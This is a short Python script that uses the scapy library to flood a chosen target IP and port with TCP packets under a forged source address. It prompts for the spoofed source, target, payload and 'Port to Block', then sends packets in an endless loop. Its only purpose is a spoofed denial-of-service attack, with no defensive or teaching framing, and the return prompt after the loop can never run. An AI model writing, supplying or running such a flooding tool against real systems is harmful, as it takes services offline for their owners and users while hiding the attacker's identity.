#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/19/2021
import os
from scapy.all import *
os.system("clear")
print("🄱🄰🄳 🄱🄾🅈 🄱🅄🅃 🄰 🅂🄰🄳 🄱🄾🅈")

def synFlood(src, target, message, dstPort):
    ipLayer = IP(src=src, dst=target)
    tcpLayer = TCP(sport=4444, dport=dstPort)
    rawLayer = Raw(load=message)
    packet = ipLayer/tcpLayer/rawLayer
    send(packet)

src = input("Enter Source IP Address To Fake: ")
target=input("Enter Target's IP Address: ")
message = input("Enter Message FOR TCP Payload: ")
dstPort= int(input("Enter Port to Block: "))

while True:
        synFlood(src, target, message, dstPort)

option = str(input("Type y to return:"))
if option == "y":
  os.system("clear")
